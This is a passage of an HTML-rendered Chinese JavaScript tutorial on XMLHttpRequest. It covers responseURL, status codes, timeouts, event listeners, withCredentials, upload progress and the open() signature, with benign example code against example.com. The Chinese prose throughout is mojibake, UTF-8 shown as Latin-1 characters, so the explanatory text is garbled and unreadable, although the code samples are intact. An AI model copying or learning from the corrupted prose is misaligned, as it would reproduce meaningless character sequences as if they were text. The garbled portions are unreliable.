xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="xmlhttprequest-responseurl"><a href="#xmlhttprequest-responseurl" class="header-anchor">#</a> XMLHttpRequest.responseURL</h3> <p><code>XMLHttpRequest.responseURL</code>å±æ€§æ˜¯å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå‘é€æ•°æ®çš„æœåŠ¡å™¨çš„ç½‘å€ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://example.com/test'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// è¿”å› http://example.com/test</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseURL<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>æ³¨æ„ï¼Œè¿™ä¸ªå±æ€§çš„å€¼ä¸<code>open()</code>æ–¹æ³•æŒ‡å®šçš„è¯·æ±‚ç½‘å€ä¸ä¸€å®šç›¸åŒã€‚å¦‚æœæœåŠ¡å™¨ç«¯å‘ç”Ÿè·³è½¬ï¼Œè¿™ä¸ªå±æ€§è¿”å›æœ€åå®é™…è¿”å›æ•°æ®çš„ç½‘å€ã€‚å¦å¤–ï¼Œå¦‚æœåŸå§‹ URL åŒ…æ‹¬é”šç‚¹ï¼ˆfragmentï¼‰ï¼Œè¯¥å±æ€§ä¼šæŠŠé”šç‚¹å‰¥ç¦»ã€‚</p> <h3 id="xmlhttprequest-statusï¼Œxmlhttprequest-statustext"><a href="#xmlhttprequest-statusï¼Œxmlhttprequest-statustext" class="header-anchor">#</a> XMLHttpRequest.statusï¼ŒXMLHttpRequest.statusText</h3> <p><code>XMLHttpRequest.status</code>å±æ€§è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å›åº”çš„ HTTP çŠ¶æ€ç ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœé€šä¿¡æˆåŠŸçš„è¯ï¼Œè¿™ä¸ªçŠ¶æ€ç æ˜¯200ï¼›å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¿”å›çŠ¶æ€ç ï¼Œé‚£ä¹ˆè¿™ä¸ªå±æ€§é»˜è®¤æ˜¯200ã€‚è¯·æ±‚å‘å‡ºä¹‹å‰ï¼Œè¯¥å±æ€§ä¸º<code>0</code>ã€‚è¯¥å±æ€§åªè¯»ã€‚</p> <ul><li>200, OKï¼Œè®¿é—®æ­£å¸¸</li> <li>301, Moved Permanentlyï¼Œæ°¸ä¹…ç§»åŠ¨</li> <li>302, Moved temporarilyï¼Œæš‚æ—¶ç§»åŠ¨</li> <li>304, Not Modifiedï¼Œæœªä¿®æ”¹</li> <li>307, Temporary Redirectï¼Œæš‚æ—¶é‡å®šå‘</li> <li>401, Unauthorizedï¼Œæœªæˆæƒ</li> <li>403, Forbiddenï¼Œç¦æ­¢è®¿é—®</li> <li>404, Not Foundï¼Œæœªå‘ç°æŒ‡å®šç½‘å€</li> <li>500, Internal Server Errorï¼ŒæœåŠ¡å™¨å‘ç”Ÿé”™è¯¯</li></ul> <p>åŸºæœ¬ä¸Šï¼Œåªæœ‰2xxå’Œ304çš„çŠ¶æ€ç ï¼Œè¡¨ç¤ºæœåŠ¡å™¨è¿”å›æ˜¯æ­£å¸¸çŠ¶æ€ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token parameter"><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">&gt;=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> xhr<span class="token punctuation">.</span>status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">)</span>
    <span class="token operator">||</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">304</span><span class="token punctuation">)</span></span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// å¤„ç†æœåŠ¡å™¨çš„è¿”å›æ•°æ®</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token comment">// å‡ºé”™</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><code>XMLHttpRequest.statusText</code>å±æ€§è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å‘é€çš„çŠ¶æ€æç¤ºã€‚ä¸åŒäº<code>status</code>å±æ€§ï¼Œè¯¥å±æ€§åŒ…å«æ•´ä¸ªçŠ¶æ€ä¿¡æ¯ï¼Œæ¯”å¦‚â€œOKâ€å’Œâ€œNot Foundâ€ã€‚åœ¨è¯·æ±‚å‘é€ä¹‹å‰ï¼ˆå³è°ƒç”¨<code>open()</code>æ–¹æ³•ä¹‹å‰ï¼‰ï¼Œè¯¥å±æ€§çš„å€¼æ˜¯ç©ºå­—ç¬¦ä¸²ï¼›å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è¿”å›çŠ¶æ€æç¤ºï¼Œè¯¥å±æ€§çš„å€¼é»˜è®¤ä¸ºâ€œOKâ€ã€‚è¯¥å±æ€§ä¸ºåªè¯»å±æ€§ã€‚</p> <h3 id="xmlhttprequest-timeoutï¼Œxmlhttprequesteventtarget-ontimeout"><a href="#xmlhttprequest-timeoutï¼Œxmlhttprequesteventtarget-ontimeout" class="header-anchor">#</a> XMLHttpRequest.timeoutï¼ŒXMLHttpRequestEventTarget.ontimeout</h3> <p><code>XMLHttpRequest.timeout</code>å±æ€§è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºå¤šå°‘æ¯«ç§’åï¼Œå¦‚æœè¯·æ±‚ä»ç„¶æ²¡æœ‰å¾—åˆ°ç»“æœï¼Œå°±ä¼šè‡ªåŠ¨ç»ˆæ­¢ã€‚å¦‚æœè¯¥å±æ€§ç­‰äº0ï¼Œå°±è¡¨ç¤ºæ²¡æœ‰æ—¶é—´é™åˆ¶ã€‚</p> <p><code>XMLHttpRequestEventTarget.ontimeout</code>å±æ€§ç”¨äºè®¾ç½®ä¸€ä¸ªç›‘å¬å‡½æ•°ï¼Œå¦‚æœå‘ç”Ÿ timeout äº‹ä»¶ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªç›‘å¬å‡½æ•°ã€‚</p> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'/server'</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">ontimeout</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'The request for '</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">' timed out.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// å¤„ç†æœåŠ¡å™¨è¿”å›çš„æ•°æ®</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>statusText<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// æŒ‡å®š 10 ç§’é’Ÿè¶…æ—¶</span>
xhr<span class="token punctuation">.</span>timeout <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h3 id="äº‹ä»¶ç›‘å¬å±æ€§"><a href="#äº‹ä»¶ç›‘å¬å±æ€§" class="header-anchor">#</a> äº‹ä»¶ç›‘å¬å±æ€§</h3> <p>XMLHttpRequest å¯¹è±¡å¯ä»¥å¯¹ä»¥ä¸‹äº‹ä»¶æŒ‡å®šç›‘å¬å‡½æ•°ã€‚</p> <ul><li>XMLHttpRequest.onloadstartï¼šloadstart äº‹ä»¶ï¼ˆHTTP è¯·æ±‚å‘å‡ºï¼‰çš„ç›‘å¬å‡½æ•°</li> <li>XMLHttpRequest.onprogressï¼šprogressäº‹ä»¶ï¼ˆæ­£åœ¨å‘é€å’ŒåŠ è½½æ•°æ®ï¼‰çš„ç›‘å¬å‡½æ•°</li> <li>XMLHttpRequest.onabortï¼šabort äº‹ä»¶ï¼ˆè¯·æ±‚ä¸­æ­¢ï¼Œæ¯”å¦‚ç”¨æˆ·è°ƒç”¨äº†<code>abort()</code>æ–¹æ³•ï¼‰çš„ç›‘å¬å‡½æ•°</li> <li>XMLHttpRequest.onerrorï¼šerror äº‹ä»¶ï¼ˆè¯·æ±‚å¤±è´¥ï¼‰çš„ç›‘å¬å‡½æ•°</li> <li>XMLHttpRequest.onloadï¼šload äº‹ä»¶ï¼ˆè¯·æ±‚æˆåŠŸå®Œæˆï¼‰çš„ç›‘å¬å‡½æ•°</li> <li>XMLHttpRequest.ontimeoutï¼štimeout äº‹ä»¶ï¼ˆç”¨æˆ·æŒ‡å®šçš„æ—¶é™è¶…è¿‡äº†ï¼Œè¯·æ±‚è¿˜æœªå®Œæˆï¼‰çš„ç›‘å¬å‡½æ•°</li> <li>XMLHttpRequest.onloadendï¼šloadend äº‹ä»¶ï¼ˆè¯·æ±‚å®Œæˆï¼Œä¸ç®¡æˆåŠŸæˆ–å¤±è´¥ï¼‰çš„ç›‘å¬å‡½æ•°</li></ul> <p>ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">var</span> responseText <span class="token operator">=</span> xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span>
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// process the response.</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onabort</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'The request was aborted'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onprogress</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>loaded<span class="token punctuation">)</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>total<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

xhr<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'There was an error!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p><code>progress</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°æœ‰ä¸€ä¸ªäº‹ä»¶å¯¹è±¡å‚æ•°ï¼Œè¯¥å¯¹è±¡æœ‰ä¸‰ä¸ªå±æ€§ï¼š<code>loaded</code>å±æ€§è¿”å›å·²ç»ä¼ è¾“çš„æ•°æ®é‡ï¼Œ<code>total</code>å±æ€§è¿”å›æ€»çš„æ•°æ®é‡ï¼Œ<code>lengthComputable</code>å±æ€§è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºåŠ è½½çš„è¿›åº¦æ˜¯å¦å¯ä»¥è®¡ç®—ã€‚æ‰€æœ‰è¿™äº›ç›‘å¬å‡½æ•°é‡Œé¢ï¼Œåªæœ‰<code>progress</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°æœ‰å‚æ•°ï¼Œå…¶ä»–å‡½æ•°éƒ½æ²¡æœ‰å‚æ•°ã€‚</p> <p>æ³¨æ„ï¼Œå¦‚æœå‘ç”Ÿç½‘ç»œé”™è¯¯ï¼ˆæ¯”å¦‚æœåŠ¡å™¨æ— æ³•è¿é€šï¼‰ï¼Œ<code>onerror</code>äº‹ä»¶æ— æ³•è·å–æŠ¥é”™ä¿¡æ¯ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯èƒ½æ²¡æœ‰é”™è¯¯å¯¹è±¡ï¼Œæ‰€ä»¥è¿™æ ·åªèƒ½æ˜¾ç¤ºæŠ¥é”™çš„æç¤ºã€‚</p> <h3 id="xmlhttprequest-withcredentials"><a href="#xmlhttprequest-withcredentials" class="header-anchor">#</a> XMLHttpRequest.withCredentials</h3> <p><code>XMLHttpRequest.withCredentials</code>å±æ€§æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè·¨åŸŸè¯·æ±‚æ—¶ï¼Œç”¨æˆ·ä¿¡æ¯ï¼ˆæ¯”å¦‚ Cookie å’Œè®¤è¯çš„ HTTP å¤´ä¿¡æ¯ï¼‰æ˜¯å¦ä¼šåŒ…å«åœ¨è¯·æ±‚ä¹‹ä¸­ï¼Œé»˜è®¤ä¸º<code>false</code>ï¼Œå³å‘<code>example.com</code>å‘å‡ºè·¨åŸŸè¯·æ±‚æ—¶ï¼Œä¸ä¼šå‘é€<code>example.com</code>è®¾ç½®åœ¨æœ¬æœºä¸Šçš„ Cookieï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ã€‚</p> <p>å¦‚æœéœ€è¦è·¨åŸŸ AJAX è¯·æ±‚å‘é€ Cookieï¼Œéœ€è¦<code>withCredentials</code>å±æ€§è®¾ä¸º<code>true</code>ã€‚æ³¨æ„ï¼ŒåŒæºçš„è¯·æ±‚ä¸éœ€è¦è®¾ç½®è¿™ä¸ªå±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://example.com/'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span>withCredentials <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>ä¸ºäº†è®©è¿™ä¸ªå±æ€§ç”Ÿæ•ˆï¼ŒæœåŠ¡å™¨å¿…é¡»æ˜¾å¼è¿”å›<code>Access-Control-Allow-Credentials</code>è¿™ä¸ªå¤´ä¿¡æ¯ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>Access<span class="token operator">-</span>Control<span class="token operator">-</span>Allow<span class="token operator">-</span>Credentials<span class="token operator">:</span> <span class="token boolean">true</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>withCredentials</code>å±æ€§æ‰“å¼€çš„è¯ï¼Œè·¨åŸŸè¯·æ±‚ä¸ä»…ä¼šå‘é€ Cookieï¼Œè¿˜ä¼šè®¾ç½®è¿œç¨‹ä¸»æœºæŒ‡å®šçš„ Cookieã€‚åä¹‹ä¹Ÿæˆç«‹ï¼Œå¦‚æœ<code>withCredentials</code>å±æ€§æ²¡æœ‰æ‰“å¼€ï¼Œé‚£ä¹ˆè·¨åŸŸçš„ AJAX è¯·æ±‚å³ä½¿æ˜ç¡®è¦æ±‚æµè§ˆå™¨è®¾ç½® Cookieï¼Œæµè§ˆå™¨ä¹Ÿä¼šå¿½ç•¥ã€‚</p> <p>æ³¨æ„ï¼Œè„šæœ¬æ€»æ˜¯éµå®ˆåŒæºæ”¿ç­–ï¼Œæ— æ³•ä»<code>document.cookie</code>æˆ–è€… HTTP å›åº”çš„å¤´ä¿¡æ¯ä¹‹ä¸­ï¼Œè¯»å–è·¨åŸŸçš„ Cookieï¼Œ<code>withCredentials</code>å±æ€§ä¸å½±å“è¿™ä¸€ç‚¹ã€‚</p> <h3 id="xmlhttprequest-upload"><a href="#xmlhttprequest-upload" class="header-anchor">#</a> XMLHttpRequest.upload</h3> <p>XMLHttpRequest ä¸ä»…å¯ä»¥å‘é€è¯·æ±‚ï¼Œè¿˜å¯ä»¥å‘é€æ–‡ä»¶ï¼Œè¿™å°±æ˜¯ AJAX æ–‡ä»¶ä¸Šä¼ ã€‚å‘é€æ–‡ä»¶ä»¥åï¼Œé€šè¿‡<code>XMLHttpRequest.upload</code>å±æ€§å¯ä»¥å¾—åˆ°ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡è§‚å¯Ÿè¿™ä¸ªå¯¹è±¡ï¼Œå¯ä»¥å¾—çŸ¥ä¸Šä¼ çš„è¿›å±•ã€‚ä¸»è¦æ–¹æ³•å°±æ˜¯ç›‘å¬è¿™ä¸ªå¯¹è±¡çš„å„ç§äº‹ä»¶ï¼šloadstartã€loadendã€loadã€abortã€errorã€progressã€timeoutã€‚</p> <p>å‡å®šç½‘é¡µä¸Šæœ‰ä¸€ä¸ª<code>&lt;progress&gt;</code>å…ƒç´ ã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code>&lt;progress min=&quot;0&quot; max=&quot;100&quot; value=&quot;0&quot;&gt;0% complete&lt;/progress&gt;

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¯¹<code>upload</code>å±æ€§æŒ‡å®š<code>progress</code>äº‹ä»¶çš„ç›‘å¬å‡½æ•°ï¼Œå³å¯è·å¾—ä¸Šä¼ çš„è¿›åº¦ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token parameter">blobOrFile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'/server'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>

  <span class="token keyword">var</span> progressBar <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'progress'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  xhr<span class="token punctuation">.</span>upload<span class="token punctuation">.</span><span class="token function-variable function">onprogress</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>lengthComputable<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      progressBar<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>loaded <span class="token operator">/</span> e<span class="token punctuation">.</span>total<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">;</span>
      <span class="token comment">// å…¼å®¹ä¸æ”¯æŒ &lt;progress&gt; å…ƒç´ çš„è€å¼æµè§ˆå™¨</span>
      progressBar<span class="token punctuation">.</span>textContent <span class="token operator">=</span> progressBar<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>

  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>blobOrFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">upload</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'hello world'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>type<span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="_3-xmlhttprequest-çš„å®ä¾‹æ–¹æ³•"><a href="#_3-xmlhttprequest-çš„å®ä¾‹æ–¹æ³•" class="header-anchor">#</a> 3.XMLHttpRequest çš„å®ä¾‹æ–¹æ³•</h2> <h3 id="xmlhttprequest-open"><a href="#xmlhttprequest-open" class="header-anchor">#</a> XMLHttpRequest.open()</h3> <p><code>XMLHttpRequest.open()</code>æ–¹æ³•ç”¨äºæŒ‡å®š HTTP è¯·æ±‚çš„å‚æ•°ï¼Œæˆ–è€…è¯´åˆå§‹åŒ– XMLHttpRequest å®ä¾‹å¯¹è±¡ã€‚å®ƒä¸€å…±å¯ä»¥æ¥å—äº”ä¸ªå‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">void</span> <span class="token function">open</span><span class="token punctuation">(</span>
   string method<span class="token punctuation">,</span>
   string url<span class="token punctuation">,</span>
   optional boolean async<span class="token punctuation">,</span>
   optional string user<span class="token punctuation">,</span>
   optional string password
<span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><ul><li><code>method</code>ï¼šè¡¨ç¤º HTTP åŠ¨è¯æ–¹æ³•ï¼Œæ¯”å¦‚<code>GET</code>ã€<code>POST</code>ã€<code>PUT</code>ã€<code>DELETE</code>ã€<code>HEAD</code>ç­‰ã€‚</li> <li><code>url</code>: è¡¨ç¤ºè¯·æ±‚å‘é€ç›®æ ‡ URLã€‚</li> <li><code>async</code>: å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè¯·æ±‚æ˜¯å¦ä¸ºå¼‚æ­¥ï¼Œé»˜è®¤ä¸º<code>true</code>ã€‚å¦‚æœè®¾ä¸º<code>false</code>ï¼Œåˆ™<code>send()</code>æ–¹æ³•åªæœ‰ç­‰åˆ°æ”¶åˆ°æœåŠ¡å™¨è¿”å›äº†ç»“æœï¼Œæ‰ä¼šè¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚è¯¥å‚æ•°å¯é€‰ã€‚ç”±äºåŒæ­¥ AJAX è¯·æ±‚ä¼šé€ æˆæµè§ˆå™¨å¤±å»å“åº”ï¼Œè®¸å¤šæµè§ˆå™¨å·²ç»ç¦æ­¢åœ¨ä¸»çº¿ç¨‹ä½¿ç”¨ï¼Œåªå…è®¸ Worker é‡Œé¢ä½¿ç”¨ã€‚æ‰€ä»¥ï¼Œè¿™ä¸ªå‚æ•°è½»æ˜“ä¸åº”è¯¥è®¾ä¸º<code>false</code>ã€‚</li> 